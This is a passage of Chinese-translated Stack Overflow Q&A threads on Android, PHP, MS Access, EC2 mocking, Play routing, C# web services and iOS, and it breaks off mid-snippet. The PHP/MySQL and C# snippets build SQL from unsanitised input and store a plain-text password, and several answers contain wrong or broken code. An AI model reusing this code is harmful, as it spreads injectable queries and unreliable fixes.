以下是我目前拥有的。但它似乎向我展示了 1/4 星和 3/4 星，但从来没有一个合适的半星。

```
<RatingBar
    android:id="@+id/rating"
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    android:rating="3.5"
    android:numStars="7"
    android:stepSize="0.5" /> 
```

rating 和 numStars 有什么区别？我只需要一个简单的 7 面额。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-12T18:08:59.287

引用文档：

```
Attribute Name  Related Method  Description
android:isIndicator setIsIndicator(boolean) Whether this rating bar is an indicator (and non-changeable by the user). 
android:numStars        The number of stars (or rating items) to show. 
android:rating      The rating to set by default. 
android:stepSize        The step size of the rating. 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-12T18:36:21.863

好吧，显然我当前的属性值是正确的。我看到 1/4 或 3/4 星的原因是因为我的屏幕宽度不够长。当我更改为横向时，它工作得很好。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-12T18:41:06.457

> 1/7=0.1428 你的分母
> 
> [查找分母](http://www.mathsisfun.com/numbers/common-denominator.html)

# php - PHP中内爆函数的可能限制

> ID：13845927
> 
> 赞同：2
> 
> 时间：2012-12-12T18:06:44.720
> 
> 标签：php, arrays, string, implode, array-unique

我有以下代码没有按预期返回。我希望最终结果是一个字符串：

```
$organizers = array_unique($organizers);     // this returns correctly
$organizers = implode(', ', $organizers);    // this returns nothing
var_dump($organizers);                        // no data appears here
exit; 
```

该`array_unique()`函数正确返回数据，我可以看到它返回的数组。首先，该`$organizers`数组是一个简单的一维字符串数组，所有字符串的长度都小于 20 个字符。我认为问题可能在于`$organizers`超过 10,000 个索引。可以内爆的数组的长度是否有限制？有解决办法吗？我在手册中找不到任何东西，但我已经彻底测试了这段代码，我相信错误一定是 on `implode()`。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-12T19:27:03.353

我不知道是否有限制，但我想到的是你也在将数组转换为字符串。这不应该是 PHP 中的问题，但尝试将其称为内爆结果的不同变量？

```
$organizers        = array_unique($organizers);     // this returns correctly
$organizers_string = implode(', ', $organizers);    // this returns nothing

// This gives it a different space 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-12T18:52:54.760

编辑：如果由于某种原因 implode() 仍然有问题。

```
$organizers = array_unique($organizers);
$neworganizers = "";
for($i = 0; $i < sizeof($organizers); $i++)
{
    $neworganizers .= $organizers[$i];
    if($i != sizeof($organizers) - 1)
    {
        $neworganizers .= ", ";
    }
} 
```

//$neworganizers 现在等价于 .implode() 在 $organizers 上调用时应返回的内容

```
$organizers = array();
$organizers[0] = "value1";
$organizers[1] = "value2";
$organizers[2] = "value3";
$organizers[3] = "value3";
$organizers = array_unique($organizers);     // strips out last index
$organizers = implode(', ', $organizers);    // returns string of "value1, value2, value3"
echo $organizers; 
```

这似乎适用于 writecodeline.com/php/

当我尝试通过其中包含特殊字符的字符串爆炸/内爆并且它们被单引号封装时，我也遇到了旧 php 构建的问题。我知道这听起来很疯狂，但在某些服务器上可能需要双引号。

参考：在旧生产服务器上工作的个人经验。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-12T18:32:15.350

我不想认为我在陈述显而易见的事情，但不会内爆只将字符串作为参数？也许它应该更像这样......

```
$organizers = array_unique($organizers);

//I'm guessing what you wanted was an array of arrays?
$neworganizers = array();
for($i = 0; $i < sizeof($organizers); $i++)
{
    $neworganizers[$i] = implode(", ", $organizers);
}
print_r($neworganizers); 
```

# php - PHP在两个字符串之间获取文本，旋转变量 - 在一个字符串中多次

> ID：13845929
> 
> 赞同：0
> 
> 时间：2012-12-12T18:07:05.400
> 
> 标签：php, string, multiple-instances

我正在尝试为我的网站编写一个 php 脚本，该脚本将允许我使用自旋语法将单词（预定义）注入段落中。我只是不确定如何在一个脚本中多次执行此操作。例如，我有这样一段：

{fat|pudgy|lazy} 狗 {sleeps|rest|poops} 整天。

我试图让脚本访问 {text 1|text 2} 大括号之间的每组文本，然后随机选择要使用的变量（用管道分隔）。完成后，它将吐出字符串的许多变体，例如：

1.  肥狗整天睡觉。
2.  懒狗整天拉屎。等等。

我可以在 {} 括号中访问文本的第一个实例，然后旋转它，但我只是不知道如何一口气多次执行。有人做过吗？

这是我的脚本，用于访问前两个 {} 括号之间的第一个文本实例。

```
function get_between ($text, $s1, $s2) {
    $spinText = "";
    $pos_s = strpos($text,$s1);
    $pos_e = strpos($text,$s2);
    for ( $i=$pos_s+strlen($s1) ; (( $i<($pos_e)) && $i < strlen($text)) ; $i++ ) {
            $spinText .= $text[$i];
    }
    return $spinText;
}
$str = "The {fat|pudgy|lazy} dog {sleeps|rest|poops} all day long.";
$spinTextFinal = get_between($str,"{","}");

$spinTextFinalExplode = explode("|",$spinTextFinal);
print_r($spinTextFinalExplode); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-12T19:08:53.667

**解决方案1：**您可以使用`preg_replace_callback`

```
$str = "The {fat|pudgy|lazy} dog {sleeps|rest|poops} all day long.";
echo "<pre>";
for($i = 0; $i < 10; $i ++) {
    echo get_between($str, "{", "}"), PHP_EOL;
} 
```

输出

```
The fat dog rest all day long.
The lazy dog poops all day long.
The fat dog sleeps all day long.
The lazy dog sleeps all day long.
The lazy dog poops all day long.
The lazy dog poops all day long.
The pudgy dog rest all day long.
The pudgy dog rest all day long.
The fat dog poops all day long.
The fat dog rest all day long. 
```

修改功能

```
function get_between($text, $s1, $s2) {
    $text = preg_replace_callback(sprintf("/%s(.*?)%s/", preg_quote($s1), preg_quote($s2)), function ($m) {
        $l = explode("|", $m[1]);
        return $l[array_rand($l)];
    }, $text);
    return $text;
} 
```

**解决方案 2**只使用数组

```
$arr1 = array("fat","pudgy","lazy");
$arr2 = array("sleeps","rest","poops");
$str = "The %s dog %s all day long.";
echo sprintf($str,$arr1[array_rand($arr1)],$arr1[array_rand($arr1)]); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-12T18:50:40.917

弄清楚了 ：）

```
$str = "The {fat|pudgy|lazy} dog {sleeps|rest|poops} all day long.";
$start_string ='{';
$stop_string = '}';
preg_match_all('/' . $start_string. '(.*)' . $stop_string . '/Usi' , $str, $strings); 
foreach($strings[1] as &$value){
    $explodePhrase = explode("|",$value);
    $key = array_rand($explodePhrase);
    $valueX = $explodePhrase[$key];
    $string[$value] = $valueX; 
}
foreach($string as $key => $value){
    $str = str_replace($key,$value,$str);
    $str = $str; 
}
echo $str; 
```

# sql - MS Access 2010 中使用 Sum IFF 的计算字段：查询和表达式生成器

> ID：13845934
> 
> 赞同：1
> 
> 时间：2012-12-12T18:07:25.197
> 
> 标签：sql, ms-access, msbuild, ms-access-2007

在 MS Access 2010 中，我成功编写了一个查询，该查询从两个单独的表中为我提供了以下字段：[客户 ID]、[产品]、[价格]、[总价格] 和 [付款方式] 客户可以订购不同的产品或使用不同的付款方式。现在，我正在尝试有一个计算字段，该字段将仅给出每个客户在线支付的产品的总数/总和。

网上的[付款方式]代码是“D”。我将代码生成器表达式与以下表达式一起使用：

1) Sum(IIf([客户 ID] = [客户 ID] AND [付款方式] = "D", [价格], NULL))

但是，它一直给我这个错误消息：您尝试执行一个查询，该查询不包含指定表达式“客户 ID”作为聚合函数的一部分。

如果我想在 SQL（或表达式生成器）中执行此操作，我将如何执行？到目前为止，我尝试过的所有事情都会导致我收到相同的错误消息。

**编辑**
我的完整查询是：

```
SELECT CUSTOMER_INFO.ID AS [Customer ID], 
CUSTOMER_INFO.PROD_KEY AS [Product], 
CUSTOMER_INFO.PROD_PRICE AS [Price], 
CUSTOMER_INFO.SUM_PRICE AS [Total Price], 
PAYMENT_TRANZAK.PAY_METHD, 
Sum(IIf([Customer ID]=[Customer ID] And [PAY_MTHD]="D",[Price],[IsNull])) AS [Online Total]

FROM CUSTOMER_INFO INNER JOIN PAYMENT_TRANZAK ON (CUSTOMER_INFO.PROD_KEY= PAYMENT_TRANZAK.SSBSECT_CRN) AND (CUSTOMER_INFO.TERM_CODE_KEY = PAYMENT_TRANZAK.DATE_CODE)

WHERE (
((CUSTOMER_INFO.SUM_PRICE)>0) AND ((PAYMENT_TRANZAK.PAY_METHD) Is Not Null) AND     ((CUSTOMER_INFO.CUST_CODE)="RE" Or (CUSTOMER_INFO.CUST_CODE)="RW") AND   ((CUSTOMER_INFO.DATE_CODE)=[Please enter a transaction date: ]) AND   ((CUSTOMER_INFO.ESTS_CODE)="EL") AND ((CUSTOMER_INFO.STST_CODE)="AS")
)
ORDER BY CUSTOMER_INFO.ID; 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-12T20:00:20.247

您正在尝试对非聚合数据执行聚合。为了求和，函数需要一些东西来求和；一组数据。因此，您将需要一个`Group By`子句。添加该子句`GROUP BY CUSTOMER_INFO.ID`将创建每个客户 ID 的总数。您也可以将付款类型子句添加到 where 语句中，以获得正确的付款类型逻辑。

```
SELECT CUSTOMER_INFO.ID AS [Customer ID]

  , Sum([Price]) AS [Online Total] 
FROM CUSTOMER_INFO 
INNER JOIN PAYMENT_TRANZAK 
ON (CUSTOMER_INFO.PROD_KEY= PAYMENT_TRANZAK.SSBSECT_CRN) 
    AND (CUSTOMER_INFO.TERM_CODE_KEY = PAYMENT_TRANZAK.DATE_CODE)
WHERE (((CUSTOMER_INFO.SUM_PRICE)>0) 
    AND ((PAYMENT_TRANZAK.PAY_METHD) Is Not Null) 
    AND ((CUSTOMER_INFO.CUST_CODE)="RE" Or (CUSTOMER_INFO.CUST_CODE)="RW") 
    AND ((CUSTOMER_INFO.DATE_CODE)=[Please enter a transaction date: ]) 
    AND ((CUSTOMER_INFO.ESTS_CODE)="EL") 
    AND ((CUSTOMER_INFO.STST_CODE)="AS"))
    AND PAYMENT_TRANZAK.PAY_METHD="D"
GROUP BY CUSTOMER_INFO.ID
ORDER BY CUSTOMER_INFO.ID; 
```

因为您没有聚合并非所有字段都被分组的所有字段，所以无法在这种查询中表达它们。这些

*   CUSTOMER_INFO.PROD_KEY AS [产品]
*   CUSTOMER_INFO.PROD_PRICE AS [价格]
*   CUSTOMER_INFO.SUM_PRICE AS [总价]
*   PAYMENT_TRANZAK.PAY_METHD

因此不是一个很好的匹配。

但是您比我更了解您的数据，也许有一种方法可以在逻辑上适应它们。这取决于你。

编辑：您可以尝试这样的查询，您不进行任何过滤，但您只需进行分组。这将显示所有内容，然后您对报告或表单进行过滤。

```
SELECT CUSTOMER_INFO.ID AS [Customer ID]
  , CUSTOMER_INFO.CUST_CODE
  , Sum(CUSTOMER_INFO.PROD_PRICE) AS [Online Total] 
  , Sum(CUSTOMER_INFO.SUM_PRICE) as [SumOfSumPrice]
  , CUSTOMER_INFO.CUST_CODE
  , PAYMENT_TRANZAK.PAY_METHD
  , CUSTOMER_INFO.DATE_CODE
  , CUSTOMER_INFO.ESTS_CODE
  , CUSTOMER_INFO.STST_CODE
FROM CUSTOMER_INFO 
INNER JOIN PAYMENT_TRANZAK 
ON (CUSTOMER_INFO.PROD_KEY= PAYMENT_TRANZAK.SSBSECT_CRN) 
    AND (CUSTOMER_INFO.TERM_CODE_KEY = PAYMENT_TRANZAK.DATE_CODE)
GROUP BY CUSTOMER_INFO.ID
  , CUSTOMER_INFO.CUST_CODE
  , PAYMENT_TRANZAK.PAY_METHD
  , CUSTOMER_INFO.DATE_CODE
  , CUSTOMER_INFO.ESTS_CODE
  , CUSTOMER_INFO.STST_CODE
ORDER BY CUSTOMER_INFO.ID; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-12T18:20:03.310

在 MS SQL SERVER、ORACLE、MS ACCESS 中，您需要将 select 子句中的所有其他字段添加到聚合子句中。

**从 Access Help 关于该主题的内容开始可能会有所帮助：**

Jet SQL 帮助：SELECT 字段列表中的所有字段都必须包含在 GROUP BY 子句中或作为 SQL 聚合函数的参数包含在内。来自帮助系统的这句话暗示所有对字段的引用，即使在复合引用中，也必须可以聚合（即包含在上面列出的聚合函数之一中）或包含在 GROUP BY 子句中。任何一种类型的任何表达式都被认为是聚合的。聚合函数只能采用解析为非聚合字段的字段引用表达式（即，多次聚合数据同样无效）。

[参考](http://bytes.com/topic/access/insights/936323-aggregate-query-woes)

由于聚合函数无论如何都会聚合您的查询，因此您可以在没有 group by 子句的情况下尝试它并查看。或者您可以包括每个字段。问题可能主要出在您的情况下，您有两个不同的字段，`IIF`但尚未处理空值。对于聚合，我会使用零或确保必须`Isnull`对 IIF 求和。

PS：我从手机发送了答案，第一次似乎没有完整的答案。

# testing - 用于测试的假 EC2 端点

> ID：13845936
> 
> 赞同：12
> 
> 时间：2012-12-12T18:07:33.613
> 
> 标签：testing, amazon-ec2, mocking, boto

是否有实现“假 Amazon EC2”端点的开源包？具体来说，一种可用于针对与 EC2 通信的客户端进行测试（特别是使用 boto）？

我知道那里有几个实现 EC2 API 的开源云解决方案（例如，OpenStack、Eucalyptus、CloudStack），但我正在寻找可以快速启动假 EC2 服务器并使用预设响应对其进行配置的东西测试目的。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-03-24T12:09:22.597

您可能想查看[moto](https://github.com/spulec/moto "摩托")。它基本上使用 HTTPretty 来模拟 boto 本身来模拟 HTTP 层。它做得很好，看起来真的很有用。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-23T20:51:38.683

Eucalyptus 多年来一直运行社区云，可在[http://www.eucalyptus.com/eucalyptus-cloud/community-cloud](http://www.eucalyptus.com/eucalyptus-cloud/community-cloud)免费获得- 如果您想模拟不同的 EC2 API 响应，它将无法工作（需要注意的一件事是 Eucalyptus API 并不完全遵循 EC2 API，尤其是在它们设置不同字段的方式上）——如果你真的想用真正的 EC2 响应进行测试，模拟你对 Boto 的调用似乎是最好的选择

# php - 通过 PHP 将数据插入 MySQL，未识别的索引，我已经定义了它们？

> ID：13845939
> 
> 赞同：0
> 
> 时间：2012-12-12T18:07:44.387
> 
> 标签：php, mysql, insert

我正在尝试为学校项目建立一个网上商店，但我在订购部分遇到了问题。至少据我所知，我已经定义了所有变量，但它仍然显示“未识别的索引”。

这是 html 代码的表单部分（名称是丹麦语，忽略那些）

```
 <div id="bestillingform">
    <table align="center" border="0">
        <form name="bestilling" action="insert.php" method="post">
            <tr id="headline">
                <th colspan="2" align="center"><p>Bestilling</p></th>
            </tr>
            <tr>
                <td>Fornavn: </td>
                <td><input type="text" name="fornavn" ><br/></td>
            </tr>
            <tr>
                <td>Efternavn: </td>
                <td><input type="text" name="efternavn" ><br/></td>
            </tr>
            <tr>
                <td>Land: </td>
                <td><input type="text" name="land" ><br/></td>      
            </tr>
            <tr>
                <td>By: </td>
                <td><input type="text" name="by" ><br/></td>        
            </tr>
            <tr>
                <td>Pickup sted: </td>
                <td><input type="text" name="pickup" ><br/></td>        
            </tr>
            <tr>
                <td>Antal personer: </td>
                <td><input type="text" name="antal" ><br/></td>     
            </tr>   
            <tr>
                <td>Pakke: </td>
                <td><input type="text" name="pakke" ><br/></td>     
            </tr>
            <tr>
                <td>Kodeord: </td>
                <td><input type="password" name="kodeord" ><br/></td>       
            </tr>       
            <tr>
                <td colspan="2" align="center"><input type="submit" name="submit" value="Bestil" ><br/></td>
            </tr>
        </form>
    </table>
</div> 
```

这是我的php代码：

```
 $host="localhost"; 
    $user="root"; 
    $password=""; 
    $database="webshop"; 
    $table="bestilling"; 

    $fnavn = $_POST['fornavn'];
    $enavn = $_POST['efternavn'];
    $land = $_POST['land'];
    $by = $_POST['by'];
    $pickup = $_POST['pickup'];
    $antal = $_POST['antal'];
    $pakke = $_POST['pakke']; 
    $kodeord = $_POST['kodeord'];

    // Forbindelse til server
    mysql_connect($host, $user, $password)or die("Kan ikke forbinde til server");
    mysql_select_db($database)or die("Kan ikke forbinde til databasen");

    $bestil = "INSERT INTO $table(Fornavn, Efternavn, Land, By, Pickup, Antal, Pakke, Kodeord)VALUES('$fnavn', '$navn', '$land', '$by', '$pickup', '$antal', '$pakke', '$kodeord')";

    $result = mysql_query($bestil);

    if ($result){
        echo("<br>Din bestilling er blevet oprettet");
    }else{
        echo(mysql_error());
    } 

    mysql_close();
    ?> 
```

我还尝试将数据手动发布到表中，看看是否可以检索它们，以检查我是否有与数据库的连接 - 但我没有任何问题，所以我已经死了到此结束。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-12T20:04:24.523

关键字“by”是一个 mySQL 保留关键字，它是您在 INSERT 语句中描述的字段之一。你必须用 `by` 放弃它。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-12T18:14:38.367

您`$navn`在 SQL 查询中使用，但该变量实际上称为`$enavn`.

```
$bestil = "INSERT INTO $table(Fornavn, Efternavn, Land, By, Pickup, Antal, Pakke, Kodeord)VALUES('$fnavn', '$enavn', '$land', '$by', '$pickup', '$antal', '$pakke', '$kodeord')"; 
```

更改其中之一。

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-12-12T18:51:31.553

我会建议你在**输入标签**中使用**id**，比如

 **```
<input type="text" name="fornavn" id="fornavn" /> 
```

然后您将获得**$_POST['fornavn'']**中的值。**

# rest - 播放框架 CRUD

> ID：13845943
> 
> 赞同：5
> 
> 时间：2012-12-12T18:08:21.133
> 
> 标签：rest, playframework, playframework-2.0, crud

我想开发一个`RESTful`使用`CRUD`in Play 框架的应用程序。不幸的是，我找不到一种方法来定义Play`DELETE`的`PUT`路线。也许在 Play 中有 just`POST`和available ？`GET`

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-12-12T18:37:36.267

您确定不能使用 DELETE/PUT 吗？文档另有说法。

> HTTP 方法
> 
> HTTP 方法可以是 HTTP 支持的任何有效方法（GET、POST、PUT、DELETE、HEAD）。

[http://www.playframework.org/documentation/2.0.4/JavaRouting](http://www.playframework.org/documentation/2.0.4/JavaRouting)

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-12-12T18:43:11.203

Play 2.x 没有 1.x 分支已知的 CRUD 模块（幸运的是，恕我直言），用于使用非标准方法定义路由，`DELETE`或者`PUT`您只需在路由中使用所需的方法：

配置/路由：

```
PUT     /put-item     controllers.Application.putItem() 
```

无论如何，要从浏览器方法中使用它们，`GET`否则`POST`您需要创建一个 AJAX 调用，关于这个主题有一个大[的分步](https://stackoverflow.com/a/11133586/1066240)示例，无论如何您也可以通过定义使用常见的[jQuery.ajax()](http://api.jquery.com/jQuery.ajax/)构建它请求`type`

```
$.ajax({
  type: "PUT",
  url: "@routes.Application.putItem()",
  data: { name: "John", location: "Boston" }
}).done(function( msg ) {
  alert( "Data Saved: " + msg );
}); 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2016-02-16T03:26:01.150

定义这些的一个好方法是使用通配符 (*) 这将允许您使用任何有效的 http 方法，包括您询问过的那些。

例如，

```
*  /items/{id}               Items.display 
```

在路由中将允许 GET /items/15 或 PUT /items/15。使用这样的通配符可以使您的路由定义更简单、更灵活。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-12-13T10:23:15.817

如果您要从网络浏览器使用 PUT 或 DELETE，请不要忘记 OPTIONS 方法。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2015-04-23T08:09:37.703

这是我为删除和更新所做的

```
 POST   /path/:id                 controllers.Controller.update(id: Integer)
 POST   /path/:id/delete          controllers.Controller.delete(id: Integer) 
```

而在控制器中

```
 public static Result delete(Integer id) {
    Result result = null;
    if(id>0){
        //your code
    }
    else{
        result = ok("invalid id");
    }
     return result;
} 
```

它适用于我们的删除和放置

如果您的意图只是使用 RESTFul of play 框架并且您正在使用 Java，那么最好使用 CXF 或 Spring webservices 或 Jersey。Play 是一个很棒的框架，但最适合 play 的是 scala

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2016-04-08T20:27:48.007

这是一个 play scala 应用程序中的示例路由器，它使用最突出的 http 动词：

```
GET     /                                    controllers.Application.listProjects
PUT     /projects/:name                      controllers.Application.createProject(name: String)
GET     /projects/list                       controllers.Application.listProjects
GET     /projects/:id                        controllers.Application.projects(id: Long)
PUT     /projects/:id/:name                  controllers.Application.addTaskToProject(name: String, id: Long)
PATCH   /tasks/:id                           controllers.Application.modifyTask(id: Long, color:Option[String] ?= None) 
```

您可以在这里查看整个 play scala 示例项目：[https ://github.com/nemoo/play-slick3-example](https://github.com/nemoo/play-slick3-example)

# winforms - 在远程服务器上发布 WinForms 应用程序

> ID：13845944
> 
> 赞同：0
> 
> 时间：2012-12-12T18:08:28.227
> 
> 标签：winforms, iis-7.5

我想在远程服务器上发布我的 WinForms 应用程序以启用应用程序的 Web 安装。我需要一些有关如何配置 IIS 7.5 网站以启用 VS2012 发布的相关信息。我找到了一些链接，但主要是关于发布 Web 应用程序，据我所知，该过程在某些方面有所不同。在哪里可以找到有关配置 IIS 网站的信息？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-12T18:45:13.433

您指的是 ClickOnce 应用程序吗？

如果是这种情况，您只需要对将要部署的位置具有写入权限，而用户需要读取权限。

# sql - 具有不同层次结构来存储的数据库设计问题

> ID：13845945
> 
> 赞同：0
> 
> 时间：2012-12-12T18:08:28.357
> 
> 标签：sql, database, ms-access, database-design

我对数据库设计有一个小问题。我不知道如何解决我必须处理和存储这些信息的公司的不同层次结构的问题。我正在尝试制作可以存储我已经联系过或将要联系的人的信息的数据库。我还需要存储有关特定人员工作的公司的详细信息。问题是公司有不同的结构。如果我考虑某人工作的学术角色，它也可能是一所拥有学校和学院、研究机构的大学。例如，一个人在牛津大学的语言学院工作，该学院是某事学院的一部分。现在，另一个人可能在某事部为政府等部门工作。您将如何解决这个与设计相关的问题？我必须这样做，但我对它还不太熟悉。我希望它不会令人困惑。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-12T19:01:30.157

您问题的确切答案实际上取决于您尚未提供的确切要求。话虽如此，以下想法可能是开发数据库模型的不错起点：

![在此处输入图像描述](../Images/3277249574e1005a0f1b2bd6d99884a9.png)

*   组织形成一个“木头”，该木头中的每个“树”都有“根”，PARENT_ORGANIZATION_ID 为 NULL。
*   一个人可以为多个组织工作，（当然）一个组织可以雇用多个人。这种多对多关系由联结表 WORKS_AT 表示。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-12T18:53:52.127

联系人的组织可能具有不同类型的结构这一事实是否与您的数据库设计相关，这并不是很清楚。

我将从以下内容开始：

```
CREATE TABLE Contact (
  ContactId int,
  OrganizationId int,
  LastName varchar(50),
  FirstName varchar(50),
  etc...
)

CREATE TABLE Organization (
  OrganizationId int,
  OrganizationTypeId int,
  Name varchar(50),
  StreetAddress varchar(100),
  etc...
)

CREATE TABLE OrganizationType (
  OrganizationTypeId int,
  Name varchar(50),
  NonProfit bit,
  etc...
) 
```

在上述场景中，您可以将联系人与特定组织相关联，如果这对您很重要，您可以根据不同的类别对组织进行分类。

# c# - 来自 WebService (C#.NET) 的 JSON 返回数据始终为空

> ID：13845948
> 
> 赞同：0
> 
> 时间：2012-12-12T18:08:36.130
> 
> 标签：c#, ajax, json

我已经逐步检查了我的 WebServices 代码以验证我实际上是在返回数据，但是当我检查 JSON 端的返回时，它总是显示“null”。

这是 WebService 代码的片段。

**更新**：为了大大简化事情，我从 Web 服务返回一个简单的列表，而不是自定义对象，并且我还压缩了 AJAX 调用。

```
 [WebMethod]
        [ScriptMethod(ResponseFormat = ResponseFormat.Json)]

        public List<string> GetLocations(string CustomerID)
        {
            List<string> LocationsList = new List<string>();

            string sql = "select customer_site from demand_addresses where customer_identifier=" + CustomerID;
            if (gDB.ExecuteRet(sql, "DB"))
            {

                DataTable dt = gDB.GetResultDataSet(0);
                int i = 0;
                if (dt.Rows.Count > 0)
                {
                    foreach (DataRow rs in dt.Rows)
                    {
                        LocationsList.Add(rs["customer_site"].ToString());
                    }
                }  
                else
                {
                    LocationsList.Add("No Data Found.");
                }

                return LocationsList;
            }
            else
            {

                LocationsList.Add("No Data Found.");
                return LocationsList;

            } 
```

这是 AJAX 调用（已**更新**以反映下面 Kami 的评论）：

```
 $.ajax({
                              type: "POST",
                              url: "/webservices/services.asmx/GetLocations",
                              data: "{ 'CustomerID': '" + selectedCustomer + "' }",               
                              contentType: "application/json; charset=utf-8",               
                              dataType: "json",               
                              success: function (data) { alert(data.d); },               
                              error: function (status) {alert(status);}
           }); 
```

“alert(data.d)”行导致“TypeError：data is null”，如果我将其更改为“alert(data)”，我只会得到一个显示“null”的警报框。

我需要帮助理解为什么 Web 服务正确返回数据，但它没有返回 AJAX/JSON。

* * *

## 回答 #1

> 赞同：-2
> 
> 时间：2012-12-12T18:34:09.627

几天前我正在研究 wcf webservice，同样的事情也发生在我身上。在最后的退货声明中，一切正常。数据在那里，但是当我在另一边看到它时，什么都没有。

问题是自定义对象（在您的情况下为 LOCATION）具有可为空的属性，但未定义为可为空。我这样做了，它开始工作了。我仍然不确定为什么，但你应该尝试一次。

```
public class Location
    {
        public string? customer_identifier { get; set; }
        public string[]? customer_site { get; set; }
    } 
```

* * *

## 回答 #2

> 赞同：-2
> 
> 时间：2012-12-12T18:18:36.187

您没有将变量传递给`OnSuccess`函数。

另外，过去我遇到过需要使用匿名函数来调用子函数的问题。

尝试这样的事情

```
$.ajax({
    type: "POST",
    url: "/webservices/services.asmx/GetLocations",
    data: "{ 'CustomerID': '" + selectedCustomer + "' }",
    contentType: "application/json; charset=utf-8",
    dataType: "json",
    success: function(data, resp) { OnSuccess(data,resp)}, // anon function may be needed
    error: function(data,resp) { OnError(data,resp)}
}); 
```

# objective-c - 为 UIImagePickerController 裁剪设置最小缩放级别

> ID：13845949
> 
> 赞同：5
> 
> 时间：2012-12-12T18:08:39.010
> 
> 标签：objective-c, cocoa-touch, zooming, uiimagepickercontroller, crop

我正在使用 UIImagePickerController 来允许用户上传照片以在我的应用程序中使用。选择要上传的照片后，系统会提示用户裁剪他/她的照片（因为我已设置`imagePickerController.allowsEditing = YES`）。但是，如果照片是横向的（即，宽大于高），用户目前可以以不输出方形图像的方式裁剪照片。这是因为裁剪横向照片时的默认缩放级别是 aspectFit 而不是 aspectFill（因为它适用于纵向照片）。

是否可以为 UIImagePickerController 的编辑模式设置最小缩放级别？我想如果输出不是正方形的，我可以简单地自动裁剪图像，但我宁愿 UIImagePickerController 的编辑模式将其传达给用户，而不是为他/她做。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-08-10T17:59:16.253

无法以`UIImagePickerController`受支持的方式调整裁剪/编辑功能的行为。您可能会深入研究`UIImagePickerController`控制器/视图层次结构并尝试弄清楚它是如何工作的，但这不是一件易于维护或令人愉快的事情。

话虽如此，`UIImagePickerController`是 的子类`UINavigationController`，所以没有什么能阻止您实现自己的图像编辑视图控制器并将其推送到`UIImagePickerController`. 这可能不会太难，你可以把挑选的`UIImage`东西扔进一个`UIScrollView`带有显示裁剪区域的矩形覆盖层中，做一些数学运算，然后`UIImage`自己裁剪。在这种情况下，您显然可以完全控制功能，我敢打赌，与深入研究`UIImagePickerController`.

我可能会设置它像这样呈现选择器的任何视图控制器：

```
@interface MainViewController <UIImagePickerControllerDelegate, UINavigationControllerDelegate, ImageEditorViewControllerDelegate>
@end

@implementation MainViewController {
    UIImagePickerController* _imagePickerController;
}
#pragma mark IBAction
- (IBAction)pickImage:(id)sender {
    _imagePickerController = [[UIImagePickerController alloc] init];
    _imagePickerController.delegate = self;
    _imagePickerController.sourceType = UIImagePickerControllerSourceTypePhotoLibrary;
    _imagePickerController.allowsEditing = NO;

    [self presentViewController:_imagePickerController animated:YES completion:nil];
}

#pragma mark UIImagePickerControllerDelegate
- (void)imagePickerController:(UIImagePickerController *)picker didFinishPickingMediaWithInfo:(NSDictionary *)info {
    ImageEditorViewController* imageEditorViewController = [self.storyboard instantiateViewControllerWithIdentifier:@"ImageEditor"];
    imageEditorViewController.delegate = self;
    imageEditorViewController.imageToEdit = info[UIImagePickerControllerOriginalImage];

    [_imagePickerController pushViewController:imageEditorViewController animated:YES];
}

- (void)imagePickerControllerDidCancel:(UIImagePickerController *)picker {
    [self dismissViewControllerAnimated:YES completion:^{
        _imagePickerController = nil;
    }];
}

#pragma mark ImageEditorViewControllerDelegate
- (void)imageEditorViewController:(ImageEditorViewController *)imageEditorViewController didFinishWithInfo:(NSDictionary *)info {
    // TODO: Handle the edited media

    [self dismissViewControllerAnimated:YES completion:^{
        _imagePickerController = nil;
    }];
}
@end 
```

然后您的编辑视图将具有这样的界面（具有特定于您需求的实现）：

```
@protocol ImageEditorViewControllerDelegate;

@interface ImageEditorViewController : UIViewController
@property(nonatomic, strong) UIImage* imageToEdit;

@property(nonatomic, weak) id <ImageEditorViewControllerDelegate> delegate;
@end

@protocol ImageEditorViewControllerDelegate
- (void)imageEditorViewController:(ImageEditorViewController*)imageEditorViewController didFinishWithInfo:(NSDictionary*)info;
@end 
```

# php - 使用 php 脚本上传文件并使用上传的文件（名称）使用 javascript 打开 html 页面

> ID：13845951
> 
> 赞同：0
> 
> 时间：2012-12-12T18:08:45.693
> 
> 标签：php, javascript, html

我创建了一个 PHP 页面来将文件上传到服务器。
我用 javascript 创建了一个 HTML 页面，用于解析服务器上的文件。

我想上传文件，上传成功后直接打开 HTML 页面并使用（上传的）文件名作为我的 javascript 的参数。

如何将这两者结合起来。我无法让它工作。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-12T18:27:39.683

嗯，这里的信息很少，但一种方法是使用隐藏字段呈现您的 html，其中该字段的值是文件名。然后你可以调用 getElementById 或任何你用来查找选择器的方法来读取它，然后在你的 javascript 中使用它。

```
<html>
    <body>
        <span id="submittedFilename" style="display: none"><%php $filename %></span>
    </body>
</html>

<script>
    var filename = $('submittedFilename").html();
</script> 
```

另一种选择是在您呈现的 php (html) 页面中设置一个变量，然后在您的 javascript 中使用它。

```
<script>
